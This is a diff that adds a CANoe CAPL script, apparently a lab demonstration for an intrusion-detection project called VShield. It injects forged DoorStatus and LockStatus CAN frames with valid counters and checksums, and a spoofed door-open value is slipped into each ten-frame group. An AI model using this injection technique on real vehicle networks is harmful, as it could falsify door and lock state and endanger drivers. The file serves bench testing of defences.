@@ -1,0 +1,115 @@
+/*@!Encoding:936*/
+/* VShield body-domain CANoe tamper demonstration.
+ * Use only on an isolated laboratory bench.
+ */
+
+variables
+{
+  message 0x351 DoorStatus;
+  message 0x352 LockStatus;
+  msTimer TxTimer;
+  msTimer RestoreTimer;
+  byte AliveCounter = 0;
+  byte PositionInGroup = 0;
+  byte TamperPosition = 5;
+  int AttackActive = 0;
+  long LastAttackSequence = 0;
+  long TxCount = 0;
+  long ManualAttackSequence = 1000;
+}
+
+on start
+{
+  @sysvar::VShield::AttackState = 0;
+  write("BodyAttack CAPL started");
+}
+
+on sysvar_update sysvar::VShield::AttackRequest
+{
+  long sequence;
+  sequence = @sysvar::VShield::AttackRequest;
+  if (sequence != 0 && sequence != LastAttackSequence && !AttackActive)
+  {
+    LastAttackSequence = sequence;
+    AttackActive = 1;
+    PositionInGroup = 0;
+    /* Each ten-frame group replaces position 5 or 6 with one tampered frame. */
+    TamperPosition = (byte)(5 + random(2));
+    @sysvar::VShield::AttackState = 1;
+    write("BodyAttack injection started, sequence=%d, position=%d", sequence, TamperPosition);
+    setTimer(TxTimer, 1);
+    setTimer(RestoreTimer, 5000);
+  }
+}
+
+on key 'a'
+{
+  ManualAttackSequence++;
+  @sysvar::VShield::AttackRequest = ManualAttackSequence;
+  write("BodyAttack manual request=%d", ManualAttackSequence);
+}
+
+on timer TxTimer
+{
+  int index;
+  byte doorByte = 0;
+  long doorChecksum = 0;
+  long lockChecksum = 0;
+
+  if (!AttackActive)
+  {
+    return;
+  }
+  else
+  {
+    PositionInGroup++;
+    if (PositionInGroup == TamperPosition)
+    {
+      doorByte = 0x01;
+    }
+    if (PositionInGroup >= 10)
+    {
+      PositionInGroup = 0;
+      TamperPosition = (byte)(5 + random(2));
+    }
+  }
+
+  for (index = 0; index < 8; index++)
+  {
+    DoorStatus.byte(index) = 0;
+    LockStatus.byte(index) = 0;
+  }
+  DoorStatus.dlc = 8;
+  DoorStatus.byte(0) = doorByte;
+  DoorStatus.byte(6) = AliveCounter;
+
+  LockStatus.dlc = 8;
+  LockStatus.byte(1) = 0x01;
+  LockStatus.byte(6) = AliveCounter;
+  for (index = 0; index < 7; index++)
+  {
+    doorChecksum += DoorStatus.byte(index);
+    lockChecksum += LockStatus.byte(index);
+  }
+  DoorStatus.byte(7) = (byte)(doorChecksum & 0xFF);
+  LockStatus.byte(7) = (byte)(lockChecksum & 0xFF);
+
+  output(LockStatus);
+  output(DoorStatus);
+  TxCount++;
+  if ((TxCount % 10) == 0)
+  {
+    write("BodyAttack transmitted %d cycles", TxCount);
+  }
+  AliveCounter = (AliveCounter + 1) & 0x0F;
+  setTimer(TxTimer, 100);
+}
+
+on timer RestoreTimer
+{
+  AttackActive = 0;
+  PositionInGroup = 0;
+  cancelTimer(TxTimer);
+  @sysvar::VShield::AttackState = 2;
+  write("BodyAttack injection restored");
+}
